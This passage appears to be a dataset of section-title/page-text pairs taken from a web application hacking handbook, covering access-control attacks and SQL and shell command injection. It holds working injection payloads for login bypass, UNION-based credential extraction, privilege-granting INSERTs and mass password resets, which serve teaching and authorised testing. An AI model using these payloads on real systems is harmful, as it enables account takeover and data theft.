it is likely that many of the most obvious mistakes that are\ncommonly made in applying access controls will be defended against. You may\nfind that circumventing the controls implemented within the application does\nnot get you very far, because of protection in place at other layers. With this in\nmind, there are still several potential lines of attack available to you. Most\nimportantly, understanding the limitations of each type of control, in terms of\nthe protection that it does not offer, will help to you identify the vulnerabilities\nthat are most likely to affect it:\n■ Programmatic checks within the application layer may be susceptible to\ninjection-based attacks.\n(continued)"
  },
  {
    "input": "Chapter Summary",
    "output": "70779c08v6.5.qxd 9/14/07 3:18 PM Page 234\n234 Chapter 8 ■ Attacking Access Controls\nHACK STEPS (continued)\n■ Roles defined at the application server layer are often coarsely defined\nand may be incomplete.\n■ Where application components run using low-privileged operating sys-\ntem accounts, these are still typically able to read many kinds of poten-\ntially sensitive data within the host file system. Any vulnerabilities\ngranting arbitrary file access may still be usefully exploited.\n■ Vulnerabilities within the application server software itself will typically\nenable you to defeat all access controls implemented within the applica-\ntion layer, but you may still have limited access to the database and\noperating system.\n■ A single exploitable access control vulnerability in the right location may\nstill provide a starting point for serious privilege escalation. For example,\nif you discover a way to modify the role associated with your account,\nthen you may find that logging in again with that account gives you\nenhanced access at both the application and database layers.\nChapter Summary\nAccess control defects can manifest themselves in various ways. In some cases,\nthey may be uninteresting, allowing illegitimate access to a harmless function\nthat cannot be leveraged to escalate privileges any further. In other cases, find-\ning a weakness in access controls can quickly lead to a complete compromise\nof the application.\nFlaws in access control can arise from various sources: a poor application\ndesign may make it difficult or impossible to check for unauthorized access, a\nsimple oversight may leave only one or two functions unprotected, or defec-\ntive assumptions about the way users will behave can leave the application\nundefended when those assumptions are violated.\nIn many cases, finding a break in access controls is almost trivial—you sim-\nply request a common administrative URLand gain direct access to the func-\ntionality. In other cases, it may be very hard, and subtle defects may lurk deep\nwithin application logic, particularly in complex, high-security applications.\nThe most important lesson when attacking access controls is to look every-\nwhere. If you are struggling to make progress, be patient and test every single\nstep of every application function. A bug that allows you to own the entire\napplication may be just around the corner."
  },
  {
    "input": "Questions",
    "output": "70779c08v6.5.qxd 9/14/07 3:18 PM Page 235\nChapter 8 ■ Attacking Access Controls 235\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. An application may use the HTTPRefererheader to control access\nwithout any overt indication of this in its normal behavior. How can\nyou test for this weakness?\n2. You log in to an application and are redirected to the following URL:\nhttps://wahh-app.com/MyAccount.php?uid=1241126841\nThe application appears to be passing a user identifier to the\nMyAccount.phppage. The only identifier you are aware of is your\nown. How can you test whether the application is using this\nparameter to enforce access controls in an unsafe way?\n3. Aweb application on the Internet enforces access controls by examining\nusers’ source IPaddresses. Why is this behavior potentially flawed?\n4. An application’s sole purpose is to provide a searchable repository of\ninformation for use by members of the public. There are no authentica-\ntion or session-handling mechanisms. What access controls should be\nimplemented within the application?\n5. You are browsing an application and encounter several sensitive\nresources that ought to be protected from unauthorized access, and that\nhave the .xlsfile extension. Why should these immediately catch your\nattention?\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 236"
  },
  {
    "input": "Chapter 9: Injecting Code",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 237\nCHAPTER\n9\nInjecting Code\nThe topic of code injection is a huge one, encompassing dozens of different\nlanguages and environments, and a wide variety of different attacks. It would\nbe possible to write an entire book on any one of these areas, exploring all of\nthe theoretical subtleties of how vulnerabilities can arise and be exploited.\nBecause this is a practical handbook, we will focus fairly ruthlessly on the\nknowledge and techniques that you will need in order to exploit the code\ninjection flaws that exist in real-world applications.\nSQL injection is the elder statesman of code injection attacks, being still one\nof the more prevalent vulnerabilities in the wild, and frequently one of the\nmost devastating. It is also a highly fertile area of current research, and we will\nexplore in detail all of the latest attack techniques, including filter bypasses,\ninference-based attacks, and fully blind exploitation.\nWe will also examine a host of other common code injection vulnerabilities,\nincluding injection into web scripting languages, SOAP, XPath, email, LDAP,\nand the server operating system. In each case, we will describe the practical\nsteps that you can take to identify and exploit these defects. There is a concep-\ntual synergy in the process of understanding each new type of injection. Hav-\ning grasped the essentials of exploiting these half-dozen manifestations of the\nflaw, you should be confident that you can draw on this understanding when\nyou encounter a new category of injection, and indeed devise additional\nmeans of attacking those that others have already studied.\n237"
  },
  {
    "input": "Injecting into Interpreted Languages",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 238\n238 Chapter 9 ■ Injecting Code\nInjecting into Interpreted Languages\nAn interpreted language is one whose execution involves a runtime compo-\nnent that interprets the code of the language and carries out the instructions\nthat it contains. In contrast to this, a compiled language is one whose code is\nconverted into machine instructions at the time of generation; at runtime,\nthese instructions are then executed directly by the processor of the computer\nthat is running it.\nIn principle, any language can be implemented using either an interpreter\nor a compiler, and the distinction is not an inherent property of the language\nitself. Nevertheless, most languages are normally implemented in only one of\nthese two ways, and many of the core languages used in the development of\nweb applications are implemented using an interpreter, including SQL, LDAP,\nPerl, and PHP.\nBecause of the way that interpreted languages are executed, there arises a\nfamily of vulnerabilities known as code injection. In any useful application,\nuser-supplied data will be received, manipulated, and acted upon. The code\nthat is processed by the interpreter will, therefore, comprise a mix of the\ninstructions written by the programmer and the data supplied by the user. In\nsome situations, an attacker can supply crafted input that breaks out of the\ndata context, usually by supplying some syntax that has a special significance\nwithin the grammar of the interpreted language being used. The result is that\npart of this input gets interpreted as program instructions, which are executed\nin the same way as if they had been written by the original programmer. Often,\ntherefore, a successful attack will fully compromise the component of the\napplication that is being targeted.\nIn compiled languages, on the other hand, attacks designed to execute arbi-\ntrary commands are usually very different. The method for injecting code does\nnot normally leverage any syntactic feature of the language used to develop\nthe target program, and the injected payload normally contains machine code\nrather than instructions written in that language. See Chapter 15 for details of\ncommon attacks against compiled software.\nConsider the following very simple example. Helloworld is a shell script\nthat prints out a message supplied by the user:\n#!/bin/bash\necho $1\nWhen used in the way the programmer intended, this script simply takes the\ninput supplied by the user and passes this to the echo command, for example:\n[manicsprout@localhost ~]$ ./helloworld.sh “hello there”\nhello there\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 239\nChapter 9 ■ Injecting Code 239\nHowever, the shell scripting environment in which Helloworld is inter-\npreted supports the use of backticks to insert the output of a different com-\nmand within an item of data. Hence, an attacker can inject arbitrary script\ncommands, and retrieve their output, as follows:\n[manicsprout@localhost ~]$ ./helloworld.sh “`ls -la`”\ntotal 28 drwxr-xr-x 2 manicsprout manicsprout 4096 Dec 4 00:22 .\ndrwxr-xr-x 3 root root 4096 Dec 4 00:19 .. -rw-r--r-- 1 manicsprout\nmanicsprout 24 Dec 4 00:19 .bash_logout -rw-r--r-- 1 manicsprout\nmanicsprout 191 Dec 4 00:19 .bash_profile -rw-r--r-- 1 manicsprout\nmanicsprout 124 Dec 4 00:19 .bashrc -rw------- 1 manicsprout manicsprout\n706 Dec 4 00:22 .viminfo -rw-rw-r-- 1 manicsprout manicsprout 8 Dec 4\n00:22 helloworld.sh\nAlthough this example is somewhat trivial, if the vulnerable script were exe-\ncuting as root, an attacker could leverage it to escalate privileges and execute\ncommands in the context of the root user. As you will see, this exact vulnera-\nbility is still often found in web applications that interface with the operating\nsystem command shell.\nHACK STEPS\nInjection into interpreted languages is a very broad topic, encompassing many\ndifferent kinds of vulnerability and potentially affecting every component of a\nweb application’s supporting infrastructure. The detailed steps for detecting\nand exploiting code injection flaws are dependent upon the language that is\nbeing targeted and the programming techniques employed by the application’s\ndevelopers. In every instance, however, the generic approach is as follows:\n■ Supply unexpected syntax that may cause problems within the context of\nthe particular interpreted language.\n■ Identify any anomalies in the application’s response that may indicate\nthe presence of a code injection vulnerability.\n■ If any error messages are received, examine these to obtain evidence\nabout the problem that occurred on the server.\n■ If necessary, systematically modify your initial input in relevant ways\nin an attempt to confirm or disprove your tentative diagnosis of a\nvulnerability.\n■ Construct a proof-of-concept test that causes a safe command to be exe-\ncuted in a verifiable way, to conclusively prove that an exploitable code\ninjection flaw exists.\n■ Exploit the vulnerability by leveraging the functionality of the target lan-\nguage and component to achieve your objectives."
  },
  {
    "input": "Injecting into SQL",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 240\n240 Chapter 9 ■ Injecting Code\nInjecting into SQL\nAlmost every web application employs a database to store the various kinds of\ninformation that it needs in order to operate. For example, a web application\ndeployed by an online retailer might use a database to store the following\ninformation:\n■■ User accounts, credentials, and personal information\n■■ Descriptions and prices of goods for sale\n■■ Orders, account statements, and payment details\n■■ The privileges of each user within the application\nThe means of accessing information within the database is Structured Query\nLanguage, or SQL. SQL can be used to read, update, add, and delete informa-\ntion held within the database.\nSQL is an interpreted language, and web applications commonly construct\nSQL statements that incorporate user-supplied data. If this is done in an unsafe\nway, then the application may be vulnerable to SQL injection. This flaw is one\nof the most notorious vulnerabilities to have afflicted web applications. In the\nmost serious cases, SQL injection can enable an anonymous attacker to read\nand modify all data stored within the database, and even take full control of\nthe server on which the database is running.\nAs awareness of web application security has evolved, SQL injection vul-\nnerabilities have become gradually less widespread, and more difficult to\ndetect and exploit. A few years ago, it was very common to encounter SQL\ninjection vulnerabilities that could be detected simply by entering an apostro-\nphe into a HTML form field, and reading the verbose error message that the\napplication returned. Today, vulnerabilities are more likely to be tucked away\nin data fields that users cannot normally see or modify, and error messages are\nlikely to be generic and uninformative. As this trend has developed, methods\nfor finding and exploiting SQL injection flaws have evolved, using more sub-\ntle indicators of vulnerabilities, and more refined and powerful exploitation\ntechniques. We will begin by examining the most basic cases and then go on to\ndescribe the latest techniques for blind detection and exploitation.\nThere is a very wide range of databases in use to support web applications.\nWhile the fundamentals of SQL injection are common to the vast majority of\nthese, there are many differences. These range from minor variations in syntax\nthrough to significant divergences in behavior and functionality that can affect\nthe types of attack that you can pursue. For reasons of space and sanity, we\nwill restrict our actual examples to the three most common databases you are\nlikely to encounter, namely Oracle, MS-SQL, and MySQL. Wherever applica-\nble, we will draw attention to the differences between these three platforms.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 241\nChapter 9 ■ Injecting Code 241\nEquipped with the techniques we describe here, you should be able to identify\nand exploit SQL injection flaws against any other database, by performing\nsome quick additional research.\nTIP In many situations, you will find it extremely useful to have access to a\nlocal installation of the same database that is being used by the application\nyou are targeting. You will often find that you need to tweak a piece of syntax,\nor consult a built-in table or function, to achieve your objectives. The responses\nyou receive from the target application will often be incomplete or cryptic,\nrequiring some detective work to understand. All of this is much easier if you\ncan cross-reference with a fully transparent working version of the database in\nquestion.\nIf this is not feasible, a good alternative is to find a suitable interactive online\nenvironment that you can experiment on, such as the interactive tutorials at\nSQLzoo.net.\nExploiting a Basic Vulnerability\nConsider a web application deployed by a book retailer that enables users to\nsearch for products based on author, title, publisher, and so on. The entire book\ncatalog is held within a database, and the application uses SQL queries to\nretrieve details of different books based on the search terms supplied by users.\nWhen a user searches for all books published by Wiley, the application per-\nforms the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’\nThis query causes the database to check every row within the books table,\nextract each of the records where the publisher column has the value Wiley,\nand return the set of all these records. This record set is then processed by the\napplication and presented to the user within an HTML page.\nIn this query, the words to the left of the equals sign comprise SQL key-\nwords and the names of tables and columns within the database. All of this\nportion of the query was constructed by the programmer at the time the appli-\ncation was created. The expression Wiley, of course, is supplied by the user,\nand its significance is as an item of data. String data in SQL queries must be\nencapsulated within single quotation marks, to separate it from the rest of the\nquery.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 242\n242 Chapter 9 ■ Injecting Code\nNow, consider what happens when a user searches for all books published\nby O’Reilly. This causes the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘O’Reilly’\nIn this case, the query interpreter reaches the string data in the same way as\nbefore. It parses this data, which is encapsulated within single quotation\nmarks, and obtains the value O. It then encounters the expression Reilly’,\nwhich is not valid SQL syntax and so generates an error:\nIncorrect syntax near ‘Reilly’.\nServer: Msg 105, Level 15, State 1, Line 1\nUnclosed quotation mark before the character string ‘\nWhen an application behaves in this way, it is wide open to SQL injection.\nAn attacker can supply input containing a quotation mark to terminate the\nstring that he controls, and can then write arbitrary SQL to modify the query\nthat the developer intended the application to execute. In this situation, for\nexample, the attacker can modify the query to return every single book in the\nretailer’s catalog, by entering the search term:\nWiley’ OR 1=1--\nThis causes the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR 1=1--‘\nThis modifies the WHEREclause of the developer’s query to add a second con-\ndition. The database will check every row within the books table and extract\neach record where the publisher column has the value Wiley or where 1 is\nequal to 1. Because 1 is always equal to 1, the database will return every record\nwithin the books table.\nNOTE In the example shown, the double hyphen in the attacker’s input is a\nmeaningful expression in SQL that tells the query interpreter that the remainder\nof the line is a comment and should be ignored. This trick is extremely useful in\nsome SQL injection attacks, because it enables you to ignore the remainder of\nthe query created by the application developer. In the example, the application\nis encapsulating the user-supplied string in single quotation marks. Because\nthe attacker has terminated the string he controls and injected some additional\nSQL, he needs to handle the trailing quotation mark, to avoid a syntax error\noccurring as in the O’Reilly example. He achieves this by adding a double\nhyphen, causing the remainder of the query to be treated as a comment. In\nMySQL, you will need to include a space after the double hyphen, or use a\nhash character to specify a comment.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 243\nChapter 9 ■ Injecting Code 243\nTIP In some situations, an alternative way to handle the trailing quotation\nmark without using the comment symbol is to “balance the quotes” by\nconcluding the injected input with an item of string data that requires a trailing\nquote to encapsulate it. For example, entering the search term\nWiley’ OR ‘a’ = ‘a\nwill result in the query\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR ‘a’=’a’\nwhich is perfectly valid and achieves the same result as the 1 = 1attack.\nThe previous example may appear to have little security impact, because\nusers can probably access all book details using entirely legitimate means.\nHowever, we will describe shortly how many SQL injection flaws like this can\nbe used to extract arbitrary data from different database tables, and to escalate\nprivileges within the database and the database server. For this reason, any\nSQL injection vulnerability should be regarded as extremely serious, regard-\nless of its precise context within the application’s functionality.\nBypassing a Login\nIn some situations, a simple SQL injection vulnerability may have an immedi-\nately critical impact, regardless of any further attacks that could be built upon\nit. Many applications that implement a forms-based login function use a data-\nbase to store user credentials and perform a simple SQL query to validate each\nlogin attempt. A typical example of this query is:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nThis query causes the database to check every row within the users table\nand extract each record where the usernamecolumn has the value marcusand\nthe password column has the value secret. If a user’s details are returned to\nthe application, then the login attempt is successful, and the application cre-\nates an authenticated session for that user.\nAs with the search function, an attacker can inject into either the username\nor the password field to modify the query performed by the application, and\nso subvert its logic. For example, if an attacker knows that the username of the\napplication administrator is admin, he can log in as that user by supplying any\npassword and the following username:\nadmin’--\nThis causes the application to perform the following query:\nSELECT * FROM users WHERE username = ‘admin’--‘ AND password = ‘foo’\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 244\n244 Chapter 9 ■ Injecting Code\nwhich because of the comment symbol is equivalent to\nSELECT * FROM users WHERE username = ‘admin’\nand so the password check has been bypassed altogether.\nSuppose that the attacker does not know the username of the administrator.\nIn most applications, the first account in the database is an administrative user,\nbecause this account is normally created manually and then used to generate\nall other accounts via the application. Further, if the query returns the details\nfor more than one user, most applications will simply process the first user\nwhose details are returned. An attacker can often exploit this behavior to log in\nas the first user in the database by supplying the username:\n‘ OR 1=1--\nThis causes the application to perform the query\nSELECT * FROM users WHERE username = ‘’ OR 1=1--‘ AND password = ‘foo’\nwhich because of the comment symbol is equivalent to\nSELECT * FROM users WHERE username = ‘’ OR 1=1\nwhich will return the details of all application users.\nFinding SQL Injection Bugs\nIn the most obvious cases, a SQL injection flaw may be discovered and con-\nclusively verified by supplying a single item of unexpected input to the appli-\ncation. In other cases, bugs may be extremely subtle and may be difficult to\ndistinguish from other categories of vulnerability or from benign anomalies\nthat do not present any security threat. Nevertheless, there are various steps\nthat you can carry out in an ordered way to reliably verify the majority of SQL\ninjection flaws.\nNOTE In your application mapping exercises (see Chapter 4), you should have\nidentified instances where the application appears to be accessing a back-end\ndatabase, and all of these need to be probed for SQL injection flaws. In fact,\nabsolutely any item of data submitted to the server may be passed to database\nfunctions in ways that are not evident from the user’s perspective and may be\nhandled in an unsafe manner. You therefore need to probe every such item for\nSQL injection vulnerabilities. This includes all URL parameters, cookies, items of\nPOSTdata, and HTTP headers. In all cases, a vulnerability may exist in the\nhandling of both the name and value of the relevant parameter.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 245\nChapter 9 ■ Injecting Code 245\nTIP When you are probing for SQL injection vulnerabilities, be sure to walk\nthrough to completion any multistage processes in which you submit crafted\ninput, Applications frequently gather a collection of data across several\nrequests, and only persist this to the database once the complete set has been\ngathered. In this situation, you will miss many SQL injection vulnerabilities if\nyou only submit crafted data within each individual request and monitor the\napplication’s response to that request.\nString Data\nWhen user-supplied string data is incorporated into an SQL query, it is encap-\nsulated within single quotation marks. In order to exploit any SQL injection\nflaw, you will need to break out of these quotation marks.\nHACK STEPS\n■ Submit a single quotation mark as the item of data you are targeting.\nObserve whether an error occurs, or whether the result differs from\nthe original in any other way. If a detailed database error message is\nreceived, consult the “SQL Syntax and Error Reference” section of this\nchapter to understand its meaning.\n■ If an error or other divergent behavior was observed, submit two single\nquotation marks together. Databases use two single quotation marks as\nan escape sequence to represent a literal single quote, so the sequence\nis interpreted as data within the quoted string rather than the closing\nstring terminator. If this input causes the error or anomalous behavior to\ndisappear, then the application is probably vulnerable to SQL injection.\n■ As a further verification that a bug is present, you can use SQL concate-\nnator characters to construct a string that is equivalent to some benign\ninput. If the application handles your crafted input in the same way as it\ndoes the corresponding benign input, then it is likely to be vulnerable.\nEach type of database uses different methods for string concatenation.\nThe following examples can be injected to construct input that is equiva-\nlent to FOOin a vulnerable application:\nOracle: ‘||’FOO\nMS-SQL: ‘+’FOO\nMySQL: ‘ ‘FOO [note there is a space between the two quotes]\nTIP One way of confirming that the application is interacting with a back-end\ndatabase is to submit the SQL wildcard character %in a given parameter. For\nexample, submitting this in a search field often returns a large number of\nresults, indicating that the input is being passed into an SQL query. Of course,\nthis does not necessarily indicate that the application is vulnerable—only that\nyou should probe further to identify any actual flaws.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 246\n246 Chapter 9 ■ Injecting Code\nNumeric Data\nWhen user-supplied numeric data is incorporated into an SQL query, the\napplication may still handle this as string data, by encapsulating it within sin-\ngle quotation marks. You should, therefore, always perform the steps\ndescribed previously for string data. In most cases, however, numeric data is\npassed directly to the database in numeric form and so is not placed within\nsingle quotation marks. If none of the previoustests points towards the pres-\nence of a vulnerability, there are some other specific steps you can take in rela-\ntion to numeric data.\nHACK STEPS\n■ Try supplying a simple mathematical expression that is equivalent to the\noriginal numeric value. For example, if the original value was 2, try sub-\nmitting 1+1 or 3-1. If the application responds in the same way, then it\nmaybe vulnerable.\n■ The preceding test is most reliable in cases where you have confirmed\nthat the item being modified has a noticeable effect on the application’s\nbehavior. For example, if the application uses a numeric PageIDparame-\nter to specify which content should be returned, then substituting 1+1 for\n2 with equivalent results is a good sign that SQL injection is present. If,\nhowever, you can place completely arbitrary input into a numeric para-\nmeter without changing the application’s behavior, then the preceding\ntest provides no evidence of a vulnerability.\n■ If the first test is successful, you can obtain further evidence of the vul-\nnerability by using more complicated expressions which use SQL-specific\nkeywords and syntax. A good example of this is the ASCII command,\nwhich returns the numeric ASCII code of the supplied character. For\nexample, because the ASCII value of A is 65, the following expression is\nequivalent to 2 in SQL:\n67-ASCII(‘A’)\n■ The previous test will not work if single quotes are being filtered; how-\never in this situation you can exploit the fact that databases will implic-\nitly convert numeric data to string data where required. Hence, because\nthe ASCII value of the character 1 is 49, the following expression is equiv-\nalent to 2 in SQL:\n51-ASCII(1)\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 247\nChapter 9 ■ Injecting Code 247\nTIP A common mistake made when probing an application for defects such\nas SQL injection is to forget that certain characters have special meaning within\nHTTP requests. If you wish to include these characters within your attack\npayloads, then you must be careful to URL-encode them to ensure that they are\ninterpreted in the way you intend. In particular:\n■■ &and = are used to join together name/value pairs to create the query\nstring and the block of POSTdata. You should encode them using %26\nand %3d, respectively.\n■■ Literal spaces are not allowed in the query string, and if submitted will\neffectively terminate the entire string. You should encode them using +\nor %20.\n■■ Because +is used to encode spaces, if you wish to include an actual +\nin your string, you must encode it using %2b. In the previous numeric\nexample, therefore, 1+1should be submitted as 1%2b1.\n■■ The semicolon is used to separate cookie fields, and should be\nencoded using %3b.\nThese encodings are necessary whether you are editing the parameter’s value\ndirectly from your browser, with an intercepting proxy, or through any other\nmeans. If you fail to encode problem characters correctly, then you may\ninvalidate the entire request, or submit data that you did not intend to.\nThe steps described previously are normally sufficient to identify the major-\nity of SQL injection vulnerabilities, including many of those where no useful\nresults or error information is transmitted back to the browser. In some cases,\nhowever, more advanced techniques may be necessary, such as the use of time\ndelays to confirm the presence of a vulnerability. We will describe these tech-\nniques later in this chapter.\nInjecting into Different Statement Types\nThe SQL language contains a number of verbs that may appear at the begin-\nning of statements. Because it is the most commonly used verb, the majority of\nSQL injection vulnerabilities arise within SELECT statements. Indeed, discus-\nsions about SQL injection often give the impression that the vulnerability only\noccurs in connection with SELECT statements, because the examples used are\nall of this type. However, SQL injection flaws can exist within any type of state-\nment, and there are some important considerations that you need to be aware\nof in relation to each.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 248\n248 Chapter 9 ■ Injecting Code\nOf course, when you are interacting with a remote application, it is not nor-\nmally possible to know in advance what type of statement a given item of user\ninput will be processed by. However, you can usually make an educated guess\nbased upon the type of application function you are dealing with. The most\ncommon types of SQL statements and their uses are described here.\nSELECT Statements\nSELECT statements are used to retrieve information from the database. They\nare frequently employed in functions where the application returns informa-\ntion in response to user actions, such as browsing a product catalog, viewing a\nuser’s profile, or performing a search. They are also often used in login func-\ntions where user-supplied information is checked against data retrieved from\na database.\nAs in the previous examples, the entry point for SQL injection attacks is nor-\nmally the WHEREclause of the query, in which user-supplied items are passed to\nthe database to control the scope of the query’s results. Because the WHERE\nclause is usually the final component of a SELECT statement, this enables the\nattacker to use the comment symbol to truncate the query to the end of his\ninput without invalidating the syntax of the overall query.\nOccasionally, SQL injection vulnerabilities occur that affect other parts of the\nSELECTquery, such as the ORDER BYclause or the names of tables and columns.\nINSERT Statements\nINSERTstatements are used to create a new row of data within a table. They are\ncommonly used when an application adds a new entry to an audit log, creates\na new user account, or generates a new order.\nFor example, an application may allow users to self-register, specifying their\nown username and password, and may then insert the details into the users\ntable with the following statement:\nINSERT INTO users (username, password, ID, privs) VALUES (‘daf’,\n‘secret’, 2248, 1)\nIf the username or password field is vulnerable to SQL injection, then an\nattacker can insert arbitrary data into the table, including his own values for ID\nand privs. However, to do so he must ensure that the remainder of the VALUES\nclause is completed gracefully. In particular, it must contain the correct num-\nber of data items of the correct types. For example, injecting into the username\nfield, the attacker can supply the following:\nfoo’, ‘bar’, 9999, 0)--\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 249\nChapter 9 ■ Injecting Code 249\nwhich will create an account with IDof 9999 and privsof 0. Assuming that the\nprivs field is used to determine account privileges, this may enable the\nattacker to create an administrative user.\nIn some situations, when working completely blind, injecting into an INSERT\nstatement may enable an attacker to extract string data from the application.\nFor example, the attacker could grab the version string of the database and\ninsert this into a field within his own user profile, which can be displayed back\nto their browser in the normal way.\nTIP When attempting to inject into an INSERTstatement, you may not know\nin advance how many parameters are required, or what their types are. In the\npreceding situation, you can keep adding additional fields to the VALUESclause\nuntil the desired user account is actually created. For example, when injecting\ninto the usernamefield, you could submit the following:\nfoo’)--\nfoo’, 1)--\nfoo’, 1, 1)--\nfoo’, 1, 1, 1)--\nBecause most databases will implicitly cast an integer to a string, an integer\nvalue can be used at each position—in this case resulting in an account with a\nusername of fooand a password of 1, regardless of which order the other\nfields are in.\nIf you find that the value 1 is still rejected, you can try the value 2000, which\nmany databases will also implicitly cast to date-based data types.\nUPDATE Statements\nUPDATEstatements are used to modify one or more existing rows of data within\na table. They are often used in functions where a user changes the value of data\nthat already exists—for example, updating her contact information, changing\nher password, or changing the quantity on a line of an order.\nA typical UPDATEstatement works in a similar way to an INSERTstatement,\nexcept that it usually contains a WHEREclause to tell the database which rows of\nthe table to update. For example, when a user changes her password, the\napplication might perform the following query:\nUPDATE users SET password=’newsecret’ WHERE user = ‘marcus’ and password\n= ‘secret’\nThis query in effect verifies that the user’s existing password is correct\nand, if so, updates it with the new value. If the function is vulnerable to SQL\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 250\n250 Chapter 9 ■ Injecting Code\ninjection, then an attacker can bypass the existing password check and update\nthe password of the admin user by entering the following username:\nadmin’--\nNOTE Probing for SQL injection vulnerabilities in a remote application is\nalways potentially dangerous, because you have no way of knowing in advance\nquite what action the application will perform using your crafted input. In\nparticular, modifying the WHEREclause in an UPDATEstatement can cause\nchanges to be made throughout a critical table of the database. For example, if\nthe attack just described had instead supplied the username\nadmin’ or 1=1--\nthen this would cause the application to execute the query\nUPDATE users SET password=’newsecret’ WHERE user = ‘admin’ or 1=1\nwhich resets the value of every user’s password!\nBe aware that this risk exists even when you are attacking an application\nfunction that does not appear to update any existing data, such as the main\nlogin. There have been cases where following a successful login the application\nperforms various UPDATEqueries using the supplied username, meaning that\nany attack on the WHEREclause may be replicated in these other statements,\npotentially wreaking havoc within the profiles of all application users. You\nshould ensure that the application owner accepts these unavoidable risks\nbefore attempting to probe for or exploit any SQL injection flaws, and you\nshould also strongly encourage them to perform a full database backup\nbefore you begin testing.\nDELETE Statements\nDELETEstatements are used to delete one or more rows of data within a table,\nfor example when users remove an item from their shopping basket or delete\na delivery address from their personal details.\nAs with UPDATEstatements, a WHEREclause is normally used to tell the data-\nbase which rows of the table to update, and user-supplied data is most likely\nto be incorporated into this clause. Subverting the intended WHERE clause can\nhave far-reaching effects, and the same caution described for UPDATE state-\nments applies to this attack.\nThe UNION Operator\nThe UNION operator is used in SQL to combine the results of two or more\nSELECT statements into a single result set. When a web application contains a\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 251\nChapter 9 ■ Injecting Code 251\nSQL injection vulnerability that occurs in a SELECT statement, you can often\nemploy the UNION operator to perform a second, entirely separate query, and\ncombine its results with those of the first. If the results of the query are\nreturned to your browser, then this technique can be used to easily extract arbi-\ntrary data from within the database.\nRecall the application that enabled users to search for books based on\nauthor, title, publisher, and other criteria. Searching for books published by\nWiley causes the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’\nSuppose that this query returns the following set of results:\nAUTHOR TITLE YEAR\nLitchfield The Database Hacker’s Handbook 2005\nAnley The Shellcoder’s Handbook 2007\nYou saw earlier how an attacker could supply crafted input to the search\nfunction to subvert the WHEREclause of the query and so return all of the books\nheld within the database. A far more interesting attack would be to use the\nUNIONoperator to inject a second SELECTquery and append its results to those\nof the first. This second query can extract data from a different database table\naltogether. For example, entering the search term\nWiley’ UNION SELECT username,password,uid FROM users--\nwill cause the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’\nUNION\nSELECT username,password,uid FROM users--‘\nThis returns the results of the original search followed by the contents of the\nusers table:\nAUTHOR TITLE YEAR\nLitchfield The Database Hacker’s Handbook 2005\nAnley The Shellcoder’s Handbook 2007\nadmin r00tr0x 0\ncliff Reboot 1\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 252\n252 Chapter 9 ■ Injecting Code\nNOTE When the results of two or more SELECTqueries are combined using\nthe UNIONoperator, the column names of the combinedresult set are the same\nas those returned by the first SELECTquery. As shown in the preceding table ,\nusernames appear in the authorcolumn and passwords appear in the title\ncolumn. This means that when the application processes the results of the\nmodified query, it has no way of detecting that the data returned has originated\nfrom a different table altogether.\nThis simple example demonstrates the potentially huge power of the UNION\noperator when employed in a SQL injection attack. However, before it can be\nexploited in this way, two important provisos need to be considered:\n■■ When the results of two queries are combined using the UNIONoperator,\nthe two result sets must have the same structure—that is, they must\ncontain the same number of columns, which have the same or compati-\nble data types, appearing in the same order.\n■■ In order to inject a second query that will return interesting results, the\nattacker needs to know the name of the database table that he wishes to\ntarget, and the names of its relevant columns.\nLet’s look a little deeper at the first of these provisos. Suppose that the\nattacker attempts to inject a second query which returns an incorrect number\nof columns. He supplies the input\nWiley’ UNION SELECT username,password FROM users--\nThe original query returns three columns, and the injected query only\nreturns two columns. Hence, the database returns the following error:\nORA-01789: query block has incorrect number of result columns\nSuppose instead that the attacker attempts to inject a second query whose\ncolumns have incompatible data types. He supplies the input\nWiley’ UNION SELECT uid,username,password FROM users--\nThis causes the database to attempt to combine the password column from\nthe second query (which contains string data) with the year column from the\nfirst query (which contains numeric data). Because string data cannot be con-\nverted into numeric data, this causes an error:\nORA-01790: expression must have same datatype as corresponding\nexpression\nNOTE The error messages shown here are for Oracle. The equivalent\nmessages for other databases are listed in the “SQL Syntax and Error\nReference” section, later in this chapter.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 253\nChapter 9 ■ Injecting Code 253\nIn many real-world cases, the database error messages shown will be\ntrapped by the application and will not be returned to the user’s browser. It\nmay appear, therefore, that in attempting to discover the structure of the first\nquery, you are restricted to pure guesswork. However, this is not the case.\nThere are three important points that mean that your task is normally easy:\n■■ In order for the injected query to be capable of being combined with\nthe first, it is not strictly necessary that it contain the same data types.\nRather they must be compatible—that is, each data type in the second\nquery must either be identical to the corresponding type in the first or\nbe implicitly convertible to it. You have already seen that databases will\nimplicitly convert a numeric value to a string value. In fact, the value\nNULLcan be converted to any data type. Hence, if you do not know the\ndata type of a particular field, you can simply SELECT NULLfor that\nfield.\n■■ In cases where database error messages are trapped by the application,\nyou can easily determine whether your injected query was executed. If\nit has done so, then additional results will be added to those returned\nby the application from its original query. This enables you to work sys-\ntematically until you discover the structure of the query you need to\ninject.\n■■ In most cases, you can achieve your objectives simply by identifying a\nsingle field within the original query that has a string data type. This 